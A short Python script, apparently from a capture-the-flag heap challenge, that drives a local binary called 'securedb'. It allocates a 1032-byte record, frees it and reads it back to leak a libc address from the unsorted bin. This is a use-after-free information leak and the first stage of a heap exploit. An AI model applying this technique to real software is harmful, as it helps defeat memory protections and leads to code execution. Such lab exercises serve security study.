#!/usr/bin/env python3
import subprocess

proc = subprocess.Popen(['./securedb'], 
                       stdin=subprocess.PIPE, 
                       stdout=subprocess.PIPE, 
                       stderr=subprocess.PIPE,
                       text=True)

# Try different sizes to find what goes to unsorted bin
cmds = [
    "1", "test", "1032",  # new record (size 1032 > 0x410*8 + 0x10 = 0x418?)
    "2", "0",             # delete record
    "5", "0",             # read deleted record
    "0"                   # quit
]

for cmd in cmds:
    proc.stdin.write(cmd + '\n')
    proc.stdin.flush()

stdout, stderr = proc.communicate()
print("=== Libc leak test output ===")
print(stdout[-1000:])
